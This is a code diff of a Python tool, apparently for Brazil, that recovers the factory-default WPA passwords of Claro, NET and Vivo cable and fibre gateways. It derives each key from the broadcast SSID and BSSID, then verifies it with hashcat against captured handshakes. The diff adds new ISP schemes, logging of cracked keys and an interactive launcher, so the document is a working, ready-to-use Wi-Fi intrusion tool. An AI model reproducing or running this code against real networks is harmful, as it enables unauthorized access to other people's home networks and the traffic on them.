@@ -1,10 +1,19 @@
 #!/usr/bin/env python3
 """
-claro_wpa_key.py
+chave_padrao.py  --  Chave-Padrão WPA
 ------------------------------------------------------------
-Recover the DEFAULT Wi-Fi password of affected Claro cable gateways from a
-captured handshake -- and, for most gateways, straight off the beacon with no
-handshake at all.
+Recover the DEFAULT Wi-Fi password of affected Brazilian-ISP CPE from a captured
+handshake -- and, for most units, straight off the beacon with no handshake at all.
+
+Handled schemes (default SSID -> default key):
+    CLARO_ / NET_   BSSID octet 3 + the SSID's 6-hex tail  (last 8 hex)   [this file]
+    VIVO-           MAC minus its 1st octet, UPPERCASE      (last 10 hex)  [schemes.py]
+    VIVOFIBRA-      MAC minus its 1st octet, lowercase      (last 10 hex)  [schemes.py]
+
+VIVO/VIVOFIBRA derive a key ONLY on a confirmed-weak MitraStar OUI; other ODMs ship
+random keys and are flagged, not guessed (see schemes.py). Whatever the scheme, the
+tool infers the key AND, given a handshake, PROVES it with hashcat. The detailed
+CLARO write-up follows.
 
 Default scheme (affected gateways):
     default SSID = CLARO_<band><last 6 hex>   e.g. CLARO_5G3A9C2D / CLARO_2G3A9C2D
@@ -32,11 +41,11 @@ Only works while the gateway is on its factory-default SSID + password. A rename
 SSID or a user-changed password cannot be derived this way.
 
 Usage (cross-platform - Windows / macOS / Linux, no GUI):
-    python claro_wpa_key.py                       # interactive: drag files in / paste paths
-    python claro_wpa_key.py capture.hc22000 ...   # one or more captures
-    python claro_wpa_key.py -y capture.hc22000    # auto-run hashcat, no prompt
-    python claro_wpa_key.py -n capture.hc22000    # just print keys + commands
-    python claro_wpa_key.py -d capture.hc22000    # no handshake: derive + save likely keys
+    python chave_padrao.py                       # interactive: drag files in / paste paths
+    python chave_padrao.py capture.hc22000 ...   # one or more captures
+    python chave_padrao.py -y capture.hc22000    # auto-run hashcat, no prompt
+    python chave_padrao.py -n capture.hc22000    # just print keys + commands
+    python chave_padrao.py -d capture.hc22000    # no handshake: derive + save likely keys
 """
 
 import os
@@ -48,10 +57,12 @@ import shutil
 import argparse
 import subprocess
 
+import schemes           # VIVO / VIVOFIBRA derivation + the weak/hardened OUI gate
+
 # ---- config -----------------------------------------------------------------
 HASH_MODE   = 22000     # 22000 = modern WPA/WPA2 (hcxpcapngtool)
 HASHCAT_EXE = None      # None = auto-detect (PATH + common install dirs); or set a full path
-CRACK_FILE  = "claro_cracked.jsonl" # recovered keys appended here (cwd) as JSONL; git-ignored
+CRACK_FILE  = "cracked.jsonl"       # recovered keys appended here (cwd) as JSONL; git-ignored
 SAVE_CRACKS = True      # set False, or pass --no-save, to disable the results log
 FRESH_POTFILE = None    # set by --fresh: a throwaway potfile path so hashcat re-runs
                         # instead of replaying its cache; the real potfile is untouched
@@ -190,12 +201,13 @@ def parse_22000(path):
     return list(seen.values())
 
 
-# Default-format Claro SSID. Handles every variant seen in the field:
-#   CLARO_2G3A9C2D  CLARO_5G3A9C2D  CLARO_3A9C2D (no band)
+# Default-format Claro / NET SSID (NET is Claro's cable brand, same key scheme).
+# Handles every variant seen in the field:
+#   CLARO_2G3A9C2D  CLARO_5G3A9C2D  CLARO_3A9C2D (no band)  NET_2G3A9C2D  NET_5G3A9C2D
 #   CLARO_3A9C2D-5G-BH (mesh backhaul)  CLARO_3A9C2D-IoT  CLARO_2G3A9C2D-2
 # All embed the 6-hex device tail right after the (optional) band token. A rare
 # variant embeds the full 8 hex.
-_SSID_RE = re.compile(r'^CLARO_(?:2\.4G|2G|5G)?([0-9A-Fa-f]{6,12})(?![0-9A-Fa-f])',
+_SSID_RE = re.compile(r'^(?:CLARO|NET)_(?:2\.4G|2G|5G)?([0-9A-Fa-f]{6,12})(?![0-9A-Fa-f])',
                       re.IGNORECASE)
 
 
@@ -203,8 +215,8 @@ def parse_claro_ssid(essid):
     """
     -> (tail6, full8) where tail6 is the known last 6 hex (MAC octets 4-6,
     lowercase) and full8 is the complete 8-hex password if the SSID embeds it,
-    else None. Returns (None, None) for anything that isn't a default Claro SSID
-    (renamed networks like CLARO_MOVEL, CLARO_Mesh, etc. fall out here).
+    else None. Returns (None, None) for anything that isn't a default CLARO_/NET_
+    SSID (renamed networks like CLARO_MOVEL, CLARO_Mesh, etc. fall out here).
     """
     m = _SSID_RE.match((essid or "").strip())
     if not m:
@@ -284,9 +296,9 @@ def band_token(essid):
         return "mesh-BH"
     if "-IOT" in e:
         return "IoT"
-    if re.match(r"^CLARO_(?:2\.4G|2G)", e):
+    if re.match(r"^(?:CLARO|NET)_(?:2\.4G|2G)", e):
         return "2.4G"
-    if re.match(r"^CLARO_5G", e):
+    if re.match(r"^(?:CLARO|NET)_5G", e):
         return "5G"
     return "no-band"
 
@@ -443,6 +455,127 @@ def _cracked(out, net, capture, *, cls):
     _print_save_status(status, path)
 
 
+def _isp_crack_record(net, password, *, isp, source, confirmed, attempts,
+                      keyspace, gate, capture):
+    """A crack-log record for the VIVO/VIVOFIBRA schemes. Same JSONL shape as the
+    Claro records (so one log holds both); the CLARO-only fields are left null."""
+    import datetime
+    bssid = net["bssid"]
+    return {
+        "ts": datetime.datetime.now().isoformat(timespec="seconds"),
+        "ssid": net["essid"],
+        "bssid": mac_pretty(bssid),
+        "password": password,
+        "class": isp,                      # VIVO | VIVOFIBRA
+        "vendor": "MitraStar (weak block)" if gate == "weak" else None,
+        "oui": mac_pretty(bssid)[:8],
+        "gate": gate,                      # weak | unknown
+        "band": None,
+        "source": source,                  # beacon-derived | handshake-confirmed
+        "confirmed": confirmed,
+        "attempts": attempts,
+        "keyspace": keyspace,
+        "leading_byte": None,
+        "compal_case": None,
+        "capture": os.path.basename(capture),
+    }
+
+
+def _vivo_identify_only(oui_fmt, res):
+    """Detect-only tail: name the OUI's status and explain why there's no key to show.
+    Covers hardened OUIs, un-researched ('unknown') OUIs, and a weak OUI captured on
+    its non-base (5 GHz/secondary) BSSID."""
+    gate = res["gate"]
+    if gate == "hardened":
+        kv("OUI", f"{oui_fmt}  ({C.red}hardened - random key{C.reset})")
+    elif gate == "weak":
+        kv("OUI", f"{oui_fmt}  {C.yellow}(weak block, but not the base-MAC capture){C.reset}")
+    else:
+        kv("OUI", f"{oui_fmt}  {C.yellow}(OUI not yet researched){C.reset}")
+    print()
+    print(f"  {C.yellow}IDENTIFIED, not derived.{C.reset}  {C.dim}{res['note']}{C.reset}")
+    if gate == "unknown":
+        print(f"  {C.dim}VIVOFIBRA key derivation is confirmed only on specific MitraStar")
+        print(f"  OUIs; this one isn't researched yet, so the tool won't guess a key.{C.reset}")
+
+
+def handle_vivo(path, net, res, exe, run_mode):
+    """VIVO / VIVOFIBRA path (detect-only). A key is presented in exactly ONE case:
+    a confirmed-weak MitraStar OUI captured on its base MAC (SSID 4-hex tail == BSSID
+    last 4). Every other case - hardened OUI, un-researched OUI, a weak OUI on its
+    5 GHz/secondary BSSID, or a renamed SSID - is identified and explained but shows no
+    key (see schemes.py). The SSID/BSSID header is already printed by handle_net."""
+    isp = res["isp"]
+    oui_fmt = mac_pretty(net["bssid"])[:8]
+    kv("Scheme", f"{isp}  {C.dim}(MitraStar weak-firmware: key = MAC minus 1st octet, "
+                 f"{res['case']}case){C.reset}")
+
+    if not res["default"]:
+        kv("OUI", oui_fmt)
+        print()
+        print(f"  {C.yellow}Renamed / non-default {isp} SSID - nothing to derive from the name.{C.reset}")
+        return
+
+    if not res["determined"]:
+        _vivo_identify_only(oui_fmt, res)
+        return
+
+    # The one derivable case: confirmed-weak OUI, base-MAC capture.
+    key = res["key"]
+    kv("OUI", f"{oui_fmt}  {C.dim}(confirmed-weak MitraStar block, base MAC){C.reset}")
+    print()
+    kv("LIKELY KEY", f"{C.bold}{C.green}{key}{C.reset}")
+    print(f"{CONT}{C.dim}= BSSID minus its 1st octet (last 5 bytes = 10 hex){C.reset}")
+    print(f"{CONT}{C.dim}{res['note']}{C.reset}")
+    if copy_to_clipboard(key):
+        print(f"{CONT}{C.dim}(copied to clipboard){C.reset}")
+
+    base = os.path.basename(path)
+    fq = f'"{base}"' if " " in base else base
+    print()
+    print(f"  {C.dim}hashcat  (run from this file's folder){C.reset}")
+    kv("  verify", f'hashcat -m {HASH_MODE} -a 3 {fq} {key}')
+
+    if run_mode == "derive":
+        print()
+        rec = _isp_crack_record(net, key, isp=isp, source="beacon-derived",
+                                confirmed=False, attempts=1, keyspace=1,
+                                gate=res["gate"], capture=path)
+        status, p = save_crack(rec)
+        if status == "saved":
+            print(f"  {C.dim}saved (derived, unconfirmed) to:  {p}{C.reset}")
+        else:
+            _print_save_status(status, p)
+        return
+
+    if exe is None or run_mode == "no":
+        return
+    if run_mode == "ask":
+        print()
+        if input("  Run hashcat now to verify? [y/N] ").strip().lower() != "y":
+            return
+
+    print(f"\n  {C.dim}Verifying the derived key against the handshake ...{C.reset}\n")
+    out = _run_hashcat(exe, path, key)
+    if not out:
+        print(f"\n  {C.yellow}No match - not on this default key "
+              f"(renamed / changed password, or a hardened unit).{C.reset}")
+        return
+    for line in out.splitlines():
+        pw = line.rsplit(":", 1)[-1].strip()
+        if not pw:
+            continue
+        print()
+        print(f"  {C.bold}{C.green}*** CRACKED ***{C.reset}  "
+              f"{C.dim}{isp} · beacon-derived · CONFIRMED · 1 guess{C.reset}")
+        print(f"    {C.dim}password:{C.reset}  {C.bold}{C.green}{pw}{C.reset}")
+        rec = _isp_crack_record(net, pw, isp=isp, source="handshake-confirmed",
+                                confirmed=True, attempts=1, keyspace=1,
+                                gate=res["gate"], capture=path)
+        st, p = save_crack(rec)
+        _print_save_status(st, p)
+
+
 def handle_net(idx, total, path, net, exe, run_mode):
     tag = f"[ network {idx}/{total} ]"
     print()
@@ -453,8 +586,12 @@ def handle_net(idx, total, path, net, exe, run_mode):
 
     tail6, full8 = parse_claro_ssid(net["essid"])
     if not tail6:
+        res = schemes.derive(net["essid"], net["bssid"])
+        if res:
+            return handle_vivo(path, net, res, exe, run_mode)
         print()
-        print(f"  {C.yellow}SKIPPED - not a CLARO_ default SSID.{C.reset}")
+        print(f"  {C.yellow}SKIPPED - not a recognized default SSID.{C.reset}")
+        print(f"  {C.dim}          Prefixes handled: CLARO_ NET_ VIVO- VIVOFIBRA-.{C.reset}")
         print(f"  {C.dim}          Renamed networks can't be derived from the name.{C.reset}")
         return
 
@@ -552,7 +689,7 @@ def capture_mode(path, exe, run_mode, file_no=None, file_total=None):
              else "")
     print()
     print(f"{C.dim}{BAR}{C.reset}")
-    print(f"  {C.bold}CLARO Default WPA Key{C.reset}   {C.dim}-{C.reset}   {where}{C.bold}{base}{C.reset}")
+    print(f"  {C.bold}Chave-Padrão WPA{C.reset}   {C.dim}-{C.reset}   {where}{C.bold}{base}{C.reset}")
     if not os.path.isfile(path):
         print(f"  {C.red}!! file not found{C.reset}")
         print(f"{C.dim}{BAR}{C.reset}")
@@ -577,7 +714,7 @@ def print_no_hashcat_banner():
     print("  the Wi-Fi password box (works on single-OUI gateways). To let this tool")
     print("  run hashcat for you, do ONE of:")
     print("    - install hashcat and add it to your PATH, or")
-    print("    - set HASHCAT_EXE at the top of claro_wpa_key.py to hashcat.exe, e.g.")
+    print("    - set HASHCAT_EXE at the top of chave_padrao.py to hashcat.exe, e.g.")
     print(r'         HASHCAT_EXE = r"C:\Tools\hashcat\hashcat.exe"')
     print(f"{C.dim}{BAR}{C.reset}")
 
@@ -621,7 +758,7 @@ _WORD_COMMANDS = {
 
 def _print_options(run_mode, exe):
     o = C.yellow  # option tokens
-    print(f"  {C.dim}Options - set at launch (e.g. python claro_wpa_key.py -d) or type one here:{C.reset}")
+    print(f"  {C.dim}Options - set at launch (e.g. python chave_padrao.py -d) or type one here:{C.reset}")
     print(f"    {o}-y / --run{C.reset}      auto-run hashcat for every network")
     print(f"    {o}-n / --no-run{C.reset}   just print the keys + commands (no hashcat)")
     print(f"    {o}-d / --derive{C.reset}   no handshake - derive + save the likely key(s)")
@@ -716,7 +853,7 @@ def _clear():
 def _panel(run_mode, exe):
     """The whole launcher view: title, drop hint, options, and the Mode/saving/fresh line."""
     print(f"{C.dim}{BAR}{C.reset}")
-    print(f"  {C.bold}CLARO Default WPA Key{C.reset}")
+    print(f"  {C.bold}Chave-Padrão WPA{C.reset}")
     print(f"{C.dim}{BAR}{C.reset}")
     print("  Drag .hc22000 file(s) into this window (or paste path[s]), then Enter.")
     print(f"  {C.dim}Blank line or Ctrl-C to quit.{C.reset}")
@@ -796,10 +933,11 @@ def _interactive(exe, run_mode, intro=True):
 def main():
     global SAVE_CRACKS, C, FRESH_POTFILE
     ap = argparse.ArgumentParser(
-        prog="claro_wpa_key.py",
-        description="Recover the default Wi-Fi key of affected Claro gateways "
-                    "from a .hc22000 capture. Run with no arguments for an "
-                    "interactive prompt (drag files in or paste paths).")
+        prog="chave_padrao.py",
+        description="Recover the default Wi-Fi key of affected Brazilian-ISP CPE "
+                    "(CLARO_ / NET_ / VIVO- / VIVOFIBRA-) from a .hc22000 capture. "
+                    "Run with no arguments for an interactive prompt (drag files in "
+                    "or paste paths).")
     ap.add_argument("paths", nargs="*", help=".hc22000 capture file(s)")
     g = ap.add_mutually_exclusive_group()
     g.add_argument("-y", "--run", action="store_true",
@@ -836,7 +974,7 @@ def main():
                 capture_mode(p, exe, run_mode, i, len(paths))
             # A drag-and-drop / double-click launch gets its own console window that
             # would vanish the instant we return — even (especially) when the capture
-            # had no CLARO_ networks and there's nothing but a "skipped" line to read.
+            # had no supported networks and there's nothing but a "skipped" line to read.
             # Keep it open, and let more files be dropped in.
             if _launched_standalone():
                 print()
